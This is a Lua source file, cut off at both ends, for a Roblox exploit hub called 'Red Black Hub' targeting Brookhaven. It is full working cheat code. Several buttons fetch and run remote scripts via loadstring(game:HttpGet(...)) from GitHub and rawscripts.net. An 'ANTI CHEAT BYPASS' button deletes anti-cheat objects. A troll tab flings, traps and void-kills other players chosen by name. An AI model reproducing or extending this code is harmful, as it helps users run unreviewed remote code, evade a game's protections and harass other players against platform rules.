Tab1:AddButton({"YAK HUB DO PEDRO OF WAR", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Yak-Scripts/yakhub/main/yakhub.lua", true))() 
end})

Tab1:AddButton({"SANDER X", function()
    loadstring(game:HttpGet('https://rawscripts.net/raw/Brookhaven-RP-Sander-X-Hub-Latest-Version-3-16718'))()
end})

Tab1:AddButton({"RED BLACK GUI", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/CALCULADORA-RED-BLACK-/refs/heads/main/README.md"))()
end})

Tab1:AddButton({"R4D SEM KEY", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Brookhaven-RP-R4D-script-no-key-17562"))()
end})

Tab1:AddButton({"INFINITE YIELD", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Infinite-Yield_500"))()
end})

Tab1:AddButton({"TROLL GUI", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Troll-Gui-3874"))()
end})

Tab1:AddButton({"TELEPORT TOOL", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Teleport-Tool-27419"))()
end})

Tab1:AddButton({"TELEKINESIS", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fe-Telekinesis-V5-21542"))()
end})

Tab1:AddButton({"RED BLACK HUB BY RYAN", function()
    loadstring(game:HttpGet('https://redblackhub-protected.vercel.app/script'))()
end})

Tab1:AddButton({"RED BLACK HUB BY VOLTZ", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ygagga/Red-Black-hub-1.0-/refs/heads/main/673b292c795c6275.txt"))()
end})

end

--=================================
-- FUNÇÃO NORMAL
--=================================

local function RunNormalHub()

	warn("NORMAL HUB STARTED")

	-- >>> AQUI O RED BLACK HUB NORMAL <<<

-- =========================================================
-- Função de envio de mensagem no chat
-- =========================================================
local function SendExecuteMessage(msg)
    local Players = game:GetService("Players")
    local TextChatService = game:GetService("TextChatService")
    
    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then  
        local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")  
        if channel then  
            pcall(function()  
                channel:SendAsync(msg)  
            end)  
        end  
    else  
        pcall(function()  
            game:GetService("ReplicatedStorage")  
                .DefaultChatSystemChatEvents  
                .SayMessageRequest:FireServer(msg, "All")  
        end)  
    end
end

-- Mensagem inicial
SendExecuteMessage("Red Black hub executed successfully!")

-- Serviços
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")
local SoundService = game:GetService("SoundService")
local RunService = game:GetService("RunService")

local lp = Players.LocalPlayer
local pg = lp:WaitForChild("PlayerGui")

-- Sequência de mensagens com delay
task.spawn(function()
    task.wait(1)
    SendExecuteMessage("Thanks for using the Red Black hub Brookhaven.")
    task.wait(1)  
    SendExecuteMessage("You are using the Luxurious version of the Red Black hub.")
end)

--========================================
-- RED BLACK HUB - LOADER CENTRALIZADO MAIOR
--========================================

-- CONFIG
local LOAD_TIME = 6
local HUB_TEXT = "RED BLACK HUB"
local LOGO_ID = "rbxassetid://91667192204008"
local LOADING_TEXTS = {"Loading...", "Loading Functions modules...", "Adding Labels..."}

-- LIMPA LOADER ANTIGO
for _, g in ipairs(pg:GetChildren()) do
    if g:IsA("ScreenGui") and g.Name:lower():find("rbh") then
        g:Destroy()
    end
end

-- BLUR
local blur = Instance.new("BlurEffect", Lighting)
blur.Size = 0
TweenService:Create(blur, TweenInfo.new(0.4), {Size = 18}):Play()

-- GUI PRINCIPAL
local gui = Instance.new("ScreenGui", pg)
gui.Name = "RBH_LOADER"
gui.DisplayOrder = 9999
gui.ResetOnSpawn = false

-- FRAME PRINCIPAL
local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 700, 0, 400)
frame.Position = UDim2.new(0.5, 0, 1.2, 0)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(10,10,10)
frame.BorderSizePixel = 0
frame.ClipsDescendants = true
Instance.new("UICorner", frame).CornerRadius = UDim.new(0,28)

-- BORDA RGB
local stroke = Instance.new("UIStroke", frame)
stroke.Thickness = 3
task.spawn(function()
    while frame.Parent do
        stroke.Color = Color3.fromHSV((tick()*0.2)%1,1,1)
        RunService.RenderStepped:Wait()
    end
end)

-- ANIMAÇÃO DE ENTRADA
TweenService:Create(frame, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
    Position = UDim2.new(0.5, 0, 0.45, 0)
}):Play()

-- FUNDO HACKER
local hackerLines = {}
for i = 1, 45 do
    local txt = Instance.new("TextLabel", frame)
    txt.Size = UDim2.new(0,18,1,0)
    txt.Position = UDim2.new(0, math.random(0,680), 0, -400)
    txt.BackgroundTransparency = 1
    txt.Text = string.rep("01\n", math.random(25,45))
    txt.TextColor3 = Color3.fromRGB(255, 0, 0)
    txt.Font = Enum.Font.Code
    txt.TextSize = 14
    txt.ZIndex = 1

    table.insert(hackerLines, txt)  

    task.spawn(function()  
        while txt.Parent do  
            TweenService:Create(  
                txt,  
                TweenInfo.new(math.random(4,7), Enum.EasingStyle.Linear),  
                {Position = UDim2.new(0, txt.Position.X.Offset, 0, 400)}  
            ):Play()  
            task.wait(math.random(1,2))  
        end  
    end)
end

-- LOGO CENTRAL
local logo = Instance.new("ImageLabel", frame)
logo.Size = UDim2.new(0,120,0,120)
logo.Position = UDim2.new(0.5,0,0,30)
logo.AnchorPoint = Vector2.new(0.5,0)
logo.BackgroundTransparency = 1
logo.Image = LOGO_ID
logo.ZIndex = 5

-- TEXTO HUB
local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1,0,0,40)
title.Position = UDim2.new(0,0,0,160)
title.BackgroundTransparency = 1
title.Text = HUB_TEXT
title.Font = Enum.Font.GothamBold
title.TextSize = 32
title.TextColor3 = Color3.new(1,1,1)
title.ZIndex = 5

-- TEXTO DE LOADING
local loadingLabel = Instance.new("TextLabel", frame)
loadingLabel.Size = UDim2.new(1,0,0,25)
loadingLabel.Position = UDim2.new(0,0,0,210)
loadingLabel.BackgroundTransparency = 1
loadingLabel.Font = Enum.Font.Gotham
loadingLabel.TextSize = 20
loadingLabel.TextColor3 = Color3.new(1,1,1)
loadingLabel.ZIndex = 5
loadingLabel.Text = LOADING_TEXTS[1]

-- BLOCOS GIRANDO NOS CANTOS
local function createRotatingBlock(pos)
    local block = Instance.new("Frame", frame)
    block.Size = UDim2.new(0,50,0,50)
    block.Position = pos
    block.AnchorPoint = Vector2.new(0.5,0.5)
    block.BackgroundColor3 = Color3.fromRGB(255,0,0)
    Instance.new("UICorner", block).CornerRadius = UDim.new(0,8)
    task.spawn(function()
        while block.Parent do
            TweenService:Create(block, TweenInfo.new(0.6), {
                Rotation = block.Rotation + 180,
                BackgroundColor3 = Color3.fromHSV(math.random(),1,1)
            }):Play()
            task.wait(0.6)
        end
    end)
    return block
end

createRotatingBlock(UDim2.new(0,50,0,50))
createRotatingBlock(UDim2.new(1,-50,0,50))

-- BARRA DE LOADER EM BLOCOS
local loaderContainer = Instance.new("Frame", frame)
loaderContainer.Size = UDim2.new(0, 600, 0, 35)
loaderContainer.Position = UDim2.new(0.5,0,0.85,0)
loaderContainer.AnchorPoint = Vector2.new(0.5,0.5)
loaderContainer.BackgroundColor3 = Color3.fromRGB(50,50,50)
loaderContainer.BorderSizePixel = 0
Instance.new("UICorner", loaderContainer).CornerRadius = UDim.new(0,10)

local numBlocks = 30
local blocks = {}
for i = 1, numBlocks do
    local b = Instance.new("Frame", loaderContainer)
    b.Size = UDim2.new(1/numBlocks, -2, 1, -2)
    b.Position = UDim2.new((i-1)/numBlocks, 1, 0, 1)
    b.BackgroundColor3 = Color3.fromRGB(255,0,0)
    b.BorderSizePixel = 0
    b.BackgroundTransparency = 1
    Instance.new("UICorner", b).CornerRadius = UDim.new(0,4)
    table.insert(blocks, b)
end

-- SOM DE ENTRADA
local s = Instance.new("Sound", SoundService)
s.SoundId = "rbxassetid://9118828569"
s.Volume = 0.6
s:Play()

-- ANIMAÇÃO DO LOADER
for i = 1, numBlocks do
    blocks[i].BackgroundTransparency = 0
    if i % 5 == 0 then
        loadingLabel.Text = LOADING_TEXTS[((i/5-1) % #LOADING_TEXTS)+1]
    end
    task.wait(LOAD_TIME/numBlocks)
end

-- FINALIZAÇÃO
for _, txt in ipairs(hackerLines) do
    TweenService:Create(txt, TweenInfo.new(1.5), {TextTransparency = 1}):Play()
end

TweenService:Create(frame, TweenInfo.new(1.8, Enum.EasingStyle.Quad), {Size = UDim2.new(0,0,0,0)}):Play()
TweenService:Create(blur, TweenInfo.new(1.8), {Size = 0}):Play()
task.wait(1.9)
gui:Destroy()
blur:Destroy()

print("RED BLACK HUB LOADER FINISHED")

-- =========================================================
-- BAN / VERIFICAÇÃO
-- =========================================================
local banidos = {
    ["NHHSIHHSGHHSAHHS"] = true,
}

local bannedStrings = {
    "itz",  
    "ax7",
}

local function isExactNameBanned(player)
    return banidos[player.Name] == true
end

local function isNameContainingBannedWord(player)
    local name = string.lower(player.Name)  
    local display = string.lower(player.DisplayName)  
    for _, word in ipairs(bannedStrings) do  
        if string.find(name, word) or string.find(display, word) then  
            return true  
        end  
    end  
    return false
end

local function verificarBan(player)
    local ok, res = pcall(function()  
        if isExactNameBanned(player) or isNameContainingBannedWord(player) then  
            player:Kick("Proibido no Red Black Hub.")  
            return true  
        end  
        return false  
    end)  
    if not ok then  
        warn("Erro verificando ban:", res)  
        return false  
    end  
    return res
end

local LocalPlayer = Players.LocalPlayer
if LocalPlayer then
    verificarBan(LocalPlayer)
end

-- =========================================================
-- RP NAME + BIO (BROOKHAVEN FIX)
-- =========================================================
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RE = ReplicatedStorage:WaitForChild("RE")
local RPRemote = RE:WaitForChild("1RPNam1eTex1t")
local ColorRemote = RE:WaitForChild("1RPNam1eColo1r")

-- RP NAME
RPRemote:FireServer("RolePlayName", "{RED BLACK HUB | BROOKHAVEN}")

-- RP NAME COLOR (RED)
ColorRemote:FireServer("PickingRPNameColor", Color3.fromRGB(255, 0, 0))

-- RP BIO TEXT
local bioText
if lp.Name:lower() == "scarys_cary66666" then
    bioText = "OWNER OF RED BLACK HUB"
else
    bioText = "Hello " .. lp.DisplayName
end

RPRemote:FireServer("RolePlayBio", bioText)

-- RP BIO COLOR (BLACK)
ColorRemote:FireServer("PickingRPBioColor", Color3.fromRGB(0, 0, 0))

-- =========================================================
-- AUDIO LOGIC (SISTEMA DE SEQUÊNCIA DE AUDIO)
-- =========================================================
local sons = {
    "rbxassetid://94509403808673",  
    "rbxassetid://130219836212781",  
    "rbxassetid://78430692054916",  
    "rbxassetid://154345248",  
    "rbxassetid://87484814057059",  
    "rbxassetid://113491014204126",  
    "rbxassetid://110983956928751",  
    "rbxassetid://80344181334677",  
    "rbxassetid://97529429187942",  
    "rbxassetid://5858548244",  
    "rbxassetid://15929797051",  
    "rbxassetid://113118633294800",  
    "rbxassetid://113028772835303",  
    "rbxassetid://102566984907215",  
    "rbxassetid://100835951102315",  
    "rbxassetid://4810729995",  
    "rbxassetid://78430692054916"
}

_G.somIndex = _G.somIndex or 0

local function PlayNextSound()
    _G.somIndex = _G.somIndex + 1
    if _G.somIndex > #sons then
        _G.somIndex = 1
    end
    
    local tiro = Instance.new("Sound")
    tiro.SoundId = sons[_G.somIndex]
    tiro.Volume = 1
    tiro.Parent = SoundService
    tiro:Play()
    
    task.delay(5, function()
        tiro:Destroy()
    end)
end

-- =========================================================
-- SPLASH SEQUENCIAL COM FADE E DESFOQUE
-- =========================================================
local CoreGui = game:GetService("CoreGui")  
local ContentProvider = game:GetService("ContentProvider")  

local function runSplashSequence()  
    local totalTime = 4
    local half = totalTime / 2  

    local old = CoreGui:FindFirstChild("RBH_Splash")  
    if old then old:Destroy() end  

    -- Ativa desfoque no Lighting durante os Splashes
    local splashBlur = Instance.new("BlurEffect", Lighting)
    splashBlur.Size = 20

    local guiSplash = Instance.new("ScreenGui")  
    guiSplash.Name = "RBH_Splash"  
    guiSplash.IgnoreGuiInset = true  
    guiSplash.ResetOnSpawn = false  
    guiSplash.ZIndexBehavior = Enum.ZIndexBehavior.Sibling  
    guiSplash.Parent = CoreGui  

    local img = Instance.new("ImageLabel")  
    img.Name = "Splash"  
    img.BackgroundTransparency = 1  
    img.AnchorPoint = Vector2.new(0.5, 0.5)  
    img.Position = UDim2.fromScale(0.5, 0.5)  
    img.Size = UDim2.fromScale(0.35, 0.35)  
    img.ImageTransparency = 1  
    img.Parent = guiSplash  

    local corner = Instance.new("UICorner")  
    corner.CornerRadius = UDim.new(0, 16)  
    corner.Parent = img  

    -- TAbela com a ordem das imagens que vão rodar sequencialmente
    local imageSequence = {
        "116836698110493",
        "91667192204008"
    }

    -- Roda uma imagem de cada vez
    for _, assetId in ipairs(imageSequence) do
        img.Image = "rbxassetid://" .. tostring(assetId)
        
        pcall(function()  
            ContentProvider:PreloadAsync({ img.Image })  
        end)  

        -- Toca o som respectivo da iteração atual
        PlayNextSound()

        local fadeIn = TweenService:Create(  
            img,  
            TweenInfo.new(half, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),  
            { ImageTransparency = 0 }  
        )  
        local fadeOut = TweenService:Create(  
            img,  
            TweenInfo.new(half, Enum.EasingStyle.Quad, Enum.EasingDirection.In),  
            { ImageTransparency = 1 }  
        )  

        fadeIn:Play()
        fadeIn.Completed:Wait()  
        
        task.wait(0.2) -- Pequena pausa estável com a imagem visível antes de sumir
        
        fadeOut:Play()
        fadeOut.Completed:Wait()  
        
        task.wait(0.1) -- Intervalo rápido entre uma troca de imagem e outra
    end

    -- Limpa toda a estrutura e desliga o desfoque gradualmente
    guiSplash:Destroy()  
    TweenService:Create(splashBlur, TweenInfo.new(0.4), {Size = 0}):Play()
    task.delay(0.4, function() splashBlur:Destroy() end)
end  

-- Executa toda a sequência de splash travando o script aqui até terminar
runSplashSequence()

-- =========================================================
-- EXECUÇÃO DO HUB (SÓ COMEÇA APÓS TERMINAR OS SPLASHES)
-- =========================================================
local redzlib = loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/LibraryRobloc/refs/heads/main/RedzLibrary.lua"))()

local Window = redzlib:MakeWindow({
  Title = "RED BLACK HUB-BROOKHAVEN",
  SubTitle = "HUB VERSION:3.066:BASIC",
  SaveFolder = "RedBlackHub_Brookhaven.json"
})

Window:AddMinimizeButton({
    Button = {
        Image = "rbxassetid://116836698110493",
        BackgroundTransparency = 1,
        Size = UDim2.new(0, 70, 0, 70) -- tamanho maior
    },

    Corner = {
        CornerRadius = UDim.new(30000, 10000)
    }
})

-- ==========================================
-- TAB INFO
-- ==========================================
local TabInfo = Window:MakeTab({"TAB INFO", "info"})

TabInfo:AddDiscordInvite({
    Name = "RED BLACK COMMUNITY",
    Description = "Join our official Discord server!",
    Logo = "rbxassetid://91667192204008",
    Invite = "https://discord.gg/9yYA4gHrPJ",
})

TabInfo:AddButton({"COPY YOUTUBE", function()
    setclipboard("https://m.youtube.com/@THE_MR_RED_BLACK_SCRIPTS_OWNER")
end})

TabInfo:AddButton({"COPY TIKTOK", function()
    setclipboard("https://www.tiktok.com/@the_mr_red_black_owner?_r=1&_t=ZS-92VA3VA1kST")
end})

TabInfo:AddParagraph({""})

TabInfo:AddParagraph({"IDEAS:", "The Mr Red Black Scripts Owner\nKALEBAO\nThe Mr Dog\nBolota\nSlow\nAbacate\nGabriel\nrinkzada\nStreex\nThe Clock Work Dev\nStell Win\nEggman"})

TabInfo:AddParagraph({"HUB TESTERS:", "The Mr Red Black Scripts Owner\nKALEBAO\nThe Mr Dog\nKystrypkry\nBolota\nLeopys\nSlow\nCarlinhos Cavalos\nBlack\nmimiwhat\nSkynZ\nStarFarer\nShadow\nRyan\nRed Black\nStreex\nThe Clock Work Dev\nStell Win\nEggman"})

TabInfo:AddParagraph({"WARNING", "If you get banned using the Red Black hub, send a screenshot to the Red Black Community.\nWe are 30% responsible for your ban.\nIn other words, we're going to try to unban you from the game."})

TabInfo:AddParagraph({"HELP US", "Also, if you're a developer too, feel free to help me with the scripts if you'd like."})

-- ==========================================
-- TAB MAIN
-- ==========================================
local Tab5 = Window:MakeTab({"MAIN", "home"})

local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local GuiService = game:GetService("GuiService")
local LocalPlayer = Players.LocalPlayer
local LP = Players.LocalPlayer

-- AUTO REJOIN ON KICK
local AutoRejoinEnabled = false
local KickConnection

Tab5:AddToggle({
    Name = "AUTO REJOIN ON KICK",
    Default = false,
    Callback = function(state)
        AutoRejoinEnabled = state

        if KickConnection then
            KickConnection:Disconnect()
            KickConnection = nil
        end

        if state then
            KickConnection = GuiService.ErrorMessageChanged:Connect(function(msg)
                if AutoRejoinEnabled and msg and msg ~= "" then
                    task.wait(1)
                    TeleportService:TeleportToPlaceInstance(
                        game.PlaceId,
                        game.JobId,
                        LocalPlayer
                    )
                end
            end)
        end
    end
})

-- COPY SERVER ID
Tab5:AddButton({"COPY SERVER ID", function()
    if setclipboard then
        setclipboard(game.JobId)
    end
end})

-- ANTI CHEAT BYPASS
Tab5:AddButton({"ANTI CHEAT BYPASS", function()
    for _,obj in ipairs(game:GetDescendants()) do
        if obj.Name then
            local n = string.lower(obj.Name)
            if n == "anticheat" or n == "exploit" then
                pcall(function()
                    obj:Destroy()
                end)
            end
        end
    end
end})

-- REJOIN
Tab5:AddButton({"REJOIN", function()
    game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
end})

-- JOIN/EXIT NOTIFICATION
local monitorConnections = {}

local function GetPlayerThumbnail(userId)
    local thumbType = Enum.ThumbnailType.HeadShot
    local thumbSize = Enum.ThumbnailSize.Size100x100
    local content, isReady = Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
    return content
end

local function Notify(playerName, joined)
    local text = joined and ("PLAYER %s JOINED"):format(playerName) or ("PLAYER %s LEFT"):format(playerName)
    local player = Players:FindFirstChild(playerName)
    local icon = nil
    if player then
        icon = GetPlayerThumbnail(player.UserId)
    end
    game.StarterGui:SetCore("SendNotification", {
        Title = "RED BLACK HUB",
        Text = text,
        Icon = icon or "",
        Duration = 5
    })
end

Tab5:AddToggle({
    Name = "JOIN/EXIT NOTIFICATION",
    Default = false,
    Callback = function(state)
        for _, conn in pairs(monitorConnections) do
            conn:Disconnect()
        end
        monitorConnections = {}

        if state then
            table.insert(monitorConnections, Players.PlayerAdded:Connect(function(p)
                Notify(p.Name, true)
            end))

            table.insert(monitorConnections, Players.PlayerRemoving:Connect(function(p)
                Notify(p.Name, false)
            end))
        end
    end
})

-- COPY COORDINATES
Tab5:AddButton({"COPY COORDINATES", function()
    local player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        local pos = player.Character.HumanoidRootPart.Position
        setclipboard(string.format("X: %d, Y: %d, Z: %d", pos.X, pos.Y, pos.Z))
        print("Coordenadas copiadas para a area de transferencia: ", pos)
    else
        print("Nao foi possivel obter as coordenadas.")
    end
end})

-- GOTO SAFE ZONE
Tab5:AddButton({"GOTO SAFE ZONE", function()
    local char = LP.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    hrp.CFrame = CFrame.new(1080, 76, -1070)
end})

-- SET SPAWNPOINT
local spawnCFrame = nil

Tab5:AddButton({"SET SPAWNPOINT", function()
    local player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        spawnCFrame = player.Character.HumanoidRootPart.CFrame
        print("Ponto de spawn definido!")
        
        game.StarterGui:SetCore("SendNotification", {
            Title = "SpawnPoint",
            Text = "Seu ponto de spawn foi salvo!",
            Duration = 5
        })
    else
        print("Nao foi possivel definir o ponto de spawn.")
    end
end})

game.Players.LocalPlayer.CharacterAdded:Connect(function(char)
    if spawnCFrame then
        local hrp = char:WaitForChild("HumanoidRootPart", 10)
        if hrp then
            hrp.CFrame = spawnCFrame
            print("Teleportado para o ponto de spawn salvo!")
        end
    end
end)

-- ANTI AFK
local function antiAFK()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    
    local function moverJogador()
        humanoidRootPart.CFrame = humanoidRootPart.CFrame * CFrame.new(0, 0, 0.1)
        task.wait(1)
        humanoidRootPart.CFrame = humanoidRootPart.CFrame * CFrame.new(0, 0, -0.1)
    end

    while true do
        task.wait(600)
        moverJogador()
    end
end

Tab5:AddButton({"ANTI AFK", function()
    task.spawn(antiAFK)
end})

-- Seleciona a primeira aba ao carregar o script
Window:SelectTab(TabInfo)

-- ==========================================
-- TAB TROLL
-- ==========================================
do
    local TabTroll = Window:MakeTab({"TROLL", "skull"})

    local Players = game:GetService("Players")
    local LP = Players.LocalPlayer
    local RunService = game:GetService("RunService")
    local Camera = workspace.CurrentCamera
    local ReplicatedStorage = game:GetService("ReplicatedStorage")

    local selectedPlayerName = ""
    local selectedFlingType = "FLING"
    local orbitRadius = 6
    local orbitSpeed = 0.05
    local DISTANCE = 2

    local activeConnections = {}

    local function FindTarget(name)
        if not name or name == "" then return nil end
        name = name:lower()
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LP and (plr.Name:lower():find(name) or plr.DisplayName:lower():find(name)) then
                return plr
            end
        end
        return nil
    end

    local function GetDynamicOffset(thrp)
        local isMoving = thrp.AssemblyLinearVelocity.Magnitude > 2
        return isMoving and 20 or 3
    end

    local function ClearConnection(key)
        if activeConnections[key] then
            if type(activeConnections[key]) == "thread" then
                task.cancel(activeConnections[key])
            elseif typeof(activeConnections[key]) == "RBXScriptConnection" then
                activeConnections[key]:Disconnect()
            end
            activeConnections[key] = nil
        end
        if LP.Character then
            local hrp = LP.Character:FindFirstChild("HumanoidRootPart")
            if hrp then
                hrp.AssemblyLinearVelocity = Vector3.zero
                hrp.AssemblyAngularVelocity = Vector3.zero
            end
        end
    end

    local function SpawnAndSitBoat()
        local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
        if not hrp then return nil end

        hrp.CFrame = CFrame.new(1620, -3, -318)
        task.wait(0.2)

        local re = ReplicatedStorage:FindFirstChild("RE")
        if re and re:FindFirstChild("1Ca1r") then
            local args = {
                [1] = "PickingBoat",
                [2] = "PirateFree",
                [3] = "Boat"
            }
            re["1Ca1r"]:FireServer(unpack(args))
        end

        task.wait(0.4)
        hrp.CFrame = CFrame.new(1647, 16, -327)
        task.wait(0.3)

        return workspace:FindFirstChild(LP.Name .. "Car")
    end

    TabTroll:AddTextBox({
        Name = "PLAYER NAME",
        Description = "Enter target player name",
        PlaceholderText = "Username or Display...",
        Callback = function(text)
            selectedPlayerName = text
        end
    })

    TabTroll:AddButton({"GET COUCH", function()
        local RS = ReplicatedStorage
        if RS:FindFirstChild("RE") and RS.RE:FindFirstChild("1Too1l") then
            RS.RE["1Too1l"]:InvokeServer("PickingTools", "Couch")
            task.wait(0.2)

            local backpack = LP:FindFirstChild("Backpack")
            local character = LP.Character
            if backpack and character then
                local couch = backpack:FindFirstChild("Couch")
                if couch then
                    character:FindFirstChildOfClass("Humanoid"):EquipTool(couch)
                end
            end
        end
    end})

    TabTroll:AddSection({"Basic Functions"})

    TabTroll:AddButton({"GO TO PLAYER", function()
        local target = FindTarget(selectedPlayerName)
        if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
            LP.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, DISTANCE)
        end
    end})

    TabTroll:AddToggle({
        Name = "STICK PLAYER",
        Default = false,
        Callback = function(state)
            ClearConnection("STICK PLAYER")
            if state then
                activeConnections["STICK PLAYER"] = RunService.Heartbeat:Connect(function()
                    local target = FindTarget(selectedPlayerName)
                    if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
                        LP.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, DISTANCE)
                    end
                end)
            end
        end
    })

    TabTroll:AddToggle({
        Name = "VIEW",
        Default = false,
        Callback = function(state)
            ClearConnection("VIEW")
            if state then
                activeConnections["VIEW"] = RunService.Heartbeat:Connect(function()
                    local target = FindTarget(selectedPlayerName)
                    if target and target.Character then
                        Camera.CameraSubject = target.Character:FindFirstChildOfClass("Humanoid")
                    end
                end)
            else
                if LP.Character then
                    Camera.CameraSubject = LP.Character:FindFirstChildOfClass("Humanoid")
                end
            end
        end
    })

    TabTroll:AddToggle({
        Name = "ORBITING PLAYER",
        Default = false,
        Callback = function(state)
            ClearConnection("ORBITING")
            if state then
                local angle = 0
                activeConnections["ORBITING"] = RunService.Heartbeat:Connect(function()
                    local target = FindTarget(selectedPlayerName)
                    if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
                        angle = angle + orbitSpeed
                        local x, z = math.cos(angle) * orbitRadius, math.sin(angle) * orbitRadius
                        LP.Character.HumanoidRootPart.CFrame = CFrame.new(target.Character.HumanoidRootPart.Position + Vector3.new(x, 2, z), target.Character.HumanoidRootPart.Position)
                    end
                end)
            end
        end
    })

    TabTroll:AddDropdown({
        Name = "FLING METHOD",
        Description = "Select Fling Velocity Mode",
        Options = {"FLING", "TELEPORT+FLING"},
        Default = "FLING",
        Callback = function(val)
            selectedFlingType = val
        end
    })

    TabTroll:AddSection({"Heavy Trolls"})

    TabTroll:AddToggle({
        Name = "FLING COUCH",
        Default = false,
        Callback = function(state)
            ClearConnection("FLING COUCH")
            if state then
                local rotX, rotY, rotZ = 0, 0, 0

                activeConnections["FLING COUCH"] = RunService.Heartbeat:Connect(function()
                    local target = FindTarget(selectedPlayerName)
                    if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end

                    local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
                    local thrp = target.Character.HumanoidRootPart
                    local hum = target.Character:FindFirstChildOfClass("Humanoid")

                    if not hrp then return end

                    if hum and hum.Sit then
                        if selectedFlingType == "FLING" then
                            hrp.AssemblyLinearVelocity = Vector3.new(0, 999999999, 0)
                            hrp.CFrame = CFrame.new(0, 999999, 0)
                        else
                            hrp.CFrame = CFrame.new(0, 1e18, 0)
                        end
                        ClearConnection("FLING COUCH")
                        return
                    end

                    hrp.AssemblyLinearVelocity = Vector3.new(40000, 40000, 40000)
                    hrp.AssemblyAngularVelocity = Vector3.new(40000, 40000, 40000)

                    rotX = rotX + 90
                    rotY = rotY + 120
                    rotZ = rotZ + 90

                    hrp.CFrame = thrp.CFrame * CFrame.Angles(math.rad(rotX), math.rad(rotY), math.rad(rotZ))
                end)
            end
        end
    })

    TabTroll:AddToggle({
        Name = "BRING PLAYER",
        Default = false,
        Callback = function(state)
            ClearConnection("BRING PLAYER")
            if state then
                local angle1, angle2 = 0, 0
                local lastPos = LP.Character and LP.Character.HumanoidRootPart.CFrame
                activeConnections["BRING PLAYER"] = RunService.Heartbeat:Connect(function()
                    local target = FindTarget(selectedPlayerName)
                    if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end

                    local hrp = LP.Character.HumanoidRootPart
                    local thrp = target.Character.HumanoidRootPart
                    local hum = target.Character:FindFirstChildOfClass("Humanoid")

                    if hum and hum.Sit then
                        if lastPos then hrp.CFrame = lastPos end
                        ClearConnection("BRING PLAYER")
                        return
                    end

                    local dist = GetDynamicOffset(thrp)

                    angle1 = angle1 + 1.2
                    angle2 = angle2 + 1.8
                    local x, y, z = math.cos(angle1) * dist, math.sin(angle2) * dist, math.sin(angle1) * dist
                    hrp.AssemblyLinearVelocity = Vector3.new(0, 60, 0)
                    hrp.CFrame = CFrame.new(thrp.Position + Vector3.new(x, y, z)) * CFrame.Angles(angle1, angle2, angle1)
                end)
            end
        end
    })

    TabTroll:AddToggle({
        Name = "PRISON PLAYER",
        Default = false,
        Callback = function(state)
            ClearConnection("PRISON PLAYER")
            if state then
                local angle1, angle2 = 0, 0
                activeConnections["PRISON PLAYER"] = RunService.Heartbeat:Connect(function()
                    local target = FindTarget(selectedPlayerName)
                    if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end

                    local hrp = LP.Character.HumanoidRootPart
                    local thrp = target.Character.HumanoidRootPart
                    local hum = target.Character:FindFirstChildOfClass("Humanoid")

                    if hum and hum.Sit then
                        hrp.CFrame = CFrame.new(55, 34, 631)
                        ClearConnection("PRISON PLAYER")
                        return
                    end

                    local dist = GetDynamicOffset(thrp)

                    angle1 = angle1 + 1.2
                    angle2 = angle2 + 1.8
                    local x, y, z = math.cos(angle1) * dist, math.sin(angle2) * dist, math.sin(angle1) * dist
                    hrp.AssemblyLinearVelocity = Vector3.new(0, 60, 0)
                    hrp.CFrame = CFrame.new(thrp.Position + Vector3.new(x, y, z)) * CFrame.Angles(angle1, angle2, angle1)
                end)
            end
        end
    })

    TabTroll:AddToggle({
        Name = "VOID KILL PLAYER",
        Default = false,
        Callback = function(state)
            ClearConnection("VOID KILL PLAYER")
            if state then
                local angle1, angle2 = 0, 0
                activeConnections["VOID KILL PLAYER"] = RunService.Heartbeat:Connect(function()
                    local target = FindTarget(selectedPlayerName)
                    if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end

                    local hrp = LP.Character.HumanoidRootPart
                    local thrp = target.Character.HumanoidRootPart
                    local hum = target.Character:FindFirstChildOfClass("Humanoid")

                    if hum and hum.Sit then
                        hrp.CFrame = CFrame.new(0, -900, 0)
                        ClearConnection("VOID KILL PLAYER")
                        return
                    end

                    local dist = GetDynamicOffset(thrp)

                    angle1 = angle1 + 1.2
                    angle2 = angle2 + 1.8
